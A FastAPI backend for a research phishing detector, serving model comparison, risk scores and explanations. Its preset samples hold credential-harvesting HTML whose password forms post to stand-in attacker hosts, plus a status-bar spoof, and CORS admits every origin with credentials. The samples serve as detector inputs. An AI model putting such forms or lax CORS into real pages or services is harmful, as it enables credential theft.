"""
FastAPI Production Backend for Phishing Detection System
Exposes REST endpoints for real-time URL inspection, multi-modal feature extraction,
comparative model inference (Baseline vs Proposed), calibrated risk scoring,
and SHAP security explanations.
"""

import os
import json
import time
from typing import Optional, Dict, Any, List
from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel, HttpUrl

from src.feature_extractor import MultiModalFeatureExtractor
from src.baseline_model import BaselinePipeline
from src.proposed_model import ProposedMultiModalPipeline
from src.explainability import SecurityExplainer


app = FastAPI(
    title="Intelligent Phishing Detection API",
    description="Research-Grade Multi-Modal Phishing Detection & Explainability Engine",
    version="2.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# Load Models and Artifacts
BASE_DIR = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
MODELS_DIR = os.path.join(BASE_DIR, "models")
DATA_DIR = os.path.join(BASE_DIR, "data")

extractor = MultiModalFeatureExtractor(timeout=2.5)

baseline_model_path = os.path.join(MODELS_DIR, "baseline_rf.joblib")
proposed_model_path = os.path.join(MODELS_DIR, "proposed_champion.joblib")

baseline_model: Optional[BaselinePipeline] = None
proposed_model: Optional[ProposedMultiModalPipeline] = None
explainer: Optional[SecurityExplainer] = None

if os.path.exists(baseline_model_path):
    baseline_model = BaselinePipeline.load(baseline_model_path)

if os.path.exists(proposed_model_path):
    proposed_model = ProposedMultiModalPipeline.load(proposed_model_path)
    explainer = SecurityExplainer(proposed_model)


class URLInspectionRequest(BaseModel):
    url: str
    html_content: Optional[str] = None


class BatchInspectionRequest(BaseModel):
    urls: List[str]


@app.get("/api/health")
def health_check():
    return {
        "status": "online",
        "baseline_model_loaded": baseline_model is not None,
        "proposed_model_loaded": proposed_model is not None,
        "explainer_loaded": explainer is not None
    }


@app.get("/api/benchmark")
def get_benchmark_results():
    benchmark_file = os.path.join(DATA_DIR, "benchmark_results.json")
    if not os.path.exists(benchmark_file):
        raise HTTPException(status_code=404, detail="Benchmark results not yet generated. Run run_experiments.py first.")
    with open(benchmark_file, "r") as f:
        return json.load(f)


@app.get("/api/presets")
def get_preset_samples():
    return [
        {
            "category": "Zero-Day Obfuscated Phishing",
            "name": "Deceptive Bank Subdomain Cloaking",
            "url": "http://chase-security-update.com.banking-auth-portal.tk/login.php",
            "description": "Uses deep subdomain spoofing, non-standard TLD (.tk), and deceptive login path tokens.",
            "simulated_html": "<form action='http://hacker-server.ru/steal.php'><input type='password'></form><a href='http://external-fake.com'>Help</a><iframe style='display:none'></iframe>"
        },
        {
            "category": "Zero-Day Obfuscated Phishing",
            "name": "Raw IP Address Authentication Hijack",
            "url": "http://192.168.1.105:8080/auth/paypal/verify-account",
            "description": "Bypasses domain name DNS, uses raw IP address and non-standard HTTP port 8080 with phishing keywords.",
            "simulated_html": "<form action='about:blank'><input name='password'></form>"
        },
        {
            "category": "Zero-Day Obfuscated Phishing",
            "name": "URL Shortener Redirection with Form Tampering",
            "url": "http://bit.ly/secure-login-microsoft-portal",
            "description": "Uses URL shortener token to disguise final target; HTML disables right click and tampers onmouseover.",
            "simulated_html": "<div onmouseover=\"window.status='https://microsoft.com'\">Login</div><form action='http://malicious-collector.com/post'></form>"
        },
        {
            "category": "Legitimate Website",
            "name": "GitHub (Official Repository)",
            "url": "https://github.com/login",
            "description": "Authentic enterprise platform with valid EV SSL certificate, consistent anchor links, and same-domain form actions.",
            "simulated_html": "<form action='https://github.com/session' method='post'><input type='password'></form><a href='https://github.com/features'>Features</a>"
        },
        {
            "category": "Legitimate Website",
            "name": "Wikipedia Official Knowledge Base",
            "url": "https://en.wikipedia.org/wiki/Main_Page",
            "description": "Established long-term domain, high search traffic rank, self-hosted assets, and clean DOM structure.",
            "simulated_html": "<a href='https://en.wikipedia.org/wiki/Special:Search'>Search</a><link rel='icon' href='/favicon.ico'>"
        }
    ]


@app.post("/api/analyze")
def analyze_url(req: URLInspectionRequest):
    url = req.url.strip()
    if not url:
        raise HTTPException(status_code=400, detail="URL must not be empty.")

    start_total_t = time.perf_counter()

    # 1. Multi-modal Feature Extraction
    start_feat_t = time.perf_counter()
    extracted = extractor.extract_all(url, html_content=req.html_content)
    feat_time_ms = (time.perf_counter() - start_feat_t) * 1000.0

    features_dict = extracted["features"]
    continuous_stats = extracted["continuous_stats"]

    import pandas as pd
    df_feat = pd.DataFrame([features_dict])

    # 2. Baseline Model Inference
    start_base_t = time.perf_counter()
    if baseline_model:
        base_pred = int(baseline_model.predict(df_feat)[0])
        base_proba = float(baseline_model.predict_proba(df_feat)[0, 1])
    else:
        base_pred, base_proba = 0, 0.5
    base_time_ms = (time.perf_counter() - start_base_t) * 1000.0

    # 3. Proposed Champion Model Inference
    start_prop_t = time.perf_counter()
    if proposed_model:
        prop_pred = int(proposed_model.predict(df_feat)[0])
        prop_proba = float(proposed_model.predict_proba(df_feat)[0, 1])
    else:
        prop_pred, prop_proba = 0, 0.5
    prop_time_ms = (time.perf_counter() - start_prop_t) * 1000.0

    # 4. Security Explanations & Attribution
    explanation = explainer.explain_instance(features_dict, prop_proba) if explainer else {}

    total_time_ms = (time.perf_counter() - start_total_t) * 1000.0

    # Determine risk level
    if prop_proba >= 0.70:
        risk_level = "HIGH"
        verdict = "PHISHING"
    elif prop_proba >= 0.35:
        risk_level = "SUSPICIOUS"
        verdict = "SUSPICIOUS"
    else:
        risk_level = "SAFE"
        verdict = "LEGITIMATE"

    return {
        "target_url": url,
        "verdict": verdict,
        "risk_level": risk_level,
        "proposed_system": {
            "prediction": prop_pred,
            "prediction_label": "PHISHING" if prop_pred == 1 else "LEGITIMATE",
            "phishing_probability": round(prop_proba, 4),
            "legitimate_probability": round(1.0 - prop_proba, 4),
            "calibrated": True,
            "inference_latency_ms": round(prop_time_ms, 3)
        },
        "baseline_system": {
            "prediction": base_pred,
            "prediction_label": "PHISHING" if base_pred == 1 else "LEGITIMATE",
            "phishing_probability": round(base_proba, 4),
            "legitimate_probability": round(1.0 - base_proba, 4),
            "features_used": "URL & Domain Only (14 features)",
            "inference_latency_ms": round(base_time_ms, 3)
        },
        "explanation": explanation,
        "features": features_dict,
        "continuous_stats": continuous_stats,
        "timing": {
            "feature_extraction_ms": round(feat_time_ms, 2),
            "total_latency_ms": round(total_time_ms, 2)
        }
    }


# Mount static files for frontend dashboard
FRONTEND_DIR = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "frontend")
if os.path.exists(FRONTEND_DIR):
    app.mount("/", StaticFiles(directory=FRONTEND_DIR, html=True), name="frontend")
